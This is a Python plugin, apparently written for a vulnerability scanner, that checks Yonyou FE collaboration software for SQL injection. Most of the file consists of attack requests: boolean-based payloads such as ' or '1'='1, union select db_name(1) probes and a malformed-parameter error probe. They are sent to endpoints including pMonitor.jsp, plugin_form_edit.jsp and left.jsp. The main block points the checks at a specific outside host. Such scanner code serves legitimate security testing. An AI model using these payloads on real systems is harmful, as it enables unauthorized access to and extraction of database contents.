#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-075208

import re

def assign(service, arg):
    if service == "yongyou_fe":
        return True, arg

def audit(arg): 
    url1 = 'permissionsreport/pMonitor.jsp?photoId=1&modelid=-1%27%20or%20%271%27=%271'
    url2 = 'permissionsreport/pMonitor.jsp?photoId=1&modelid=-1%27%20or%20%271%27=%272'
    code1, head, res1, errcode, _ = curl.curl2(arg + url1)
    code2, head, res2, errcode, _ = curl.curl2(arg + url2)
    m1 = re.search('nodes', res1)
    m2 = re.search('nodes', res2)
    if code1==200 and code2 ==200 and m1 and m2==None:
         security_hole(arg+'permissionsreport/pMonitor.jsp?photoId=1&modelid=1')
    
    
    url3 = 'sys/plugin/plugin_form_edit.jsp?done=&key=c%27union%20select%201,db_name(1)--'
    code3, head, res3, errcode, _ = curl.curl2(arg + url3)
    if code3 == 200 and "master" in res3:
        security_hole(arg+'sys/plugin/plugin_form_edit.jsp?done=&key=a')
    
    
    url4 = 'sys/left.jsp?lx=-1%27%20or%20%271%27=%271'
    url5 = 'sys/left.jsp?lx=-1%27%20or%20%271%27=%272'
    code4, head, res4, errcode, _ = curl.curl2(arg + url4)
    code5, head, res5, errcode, _ = curl.curl2(arg + url5)
    m3 = re.search("/images/ICON/Txt2.png",res4)
    m4 = re.search("/images/ICON/Txt2.png",res5)
    if code4 == 200 and code5 == 200 and m3 and m4 == None:
       security_hole(arg+'sys/left.jsp?lx=1'+':found sql injection!')
    
    
    url6 = 'sys/plugin/plugin_datasource_edit.jsp?done=&key=-1%27%20union%20all%20%20select%20db_name(1),2--'
    code6, head, res6, errcode, _ = curl.curl2(arg + url6)
    if code6 == 200 and 'master' in res6:
        security_hole(arg+'sys/plugin/plugin_datasource_edit.jsp?done=&key=a')
    
    
    url7 = 'cooperate/flow/selectMUDR.jsp?id=1)'
    code7, head, res7, errcode, _ = curl.curl2(arg + url7)
    if 'bad SQL grammar [];' in res7 :
        security_hole(arg+'cooperate/flow/selectMUDR.jsp?id=1')
    

if __name__ == '__main__': 
    from dummy import * 
    audit(assign('yongyou_fe', 'http://gzwnq.88ip.cn:9090/')[1])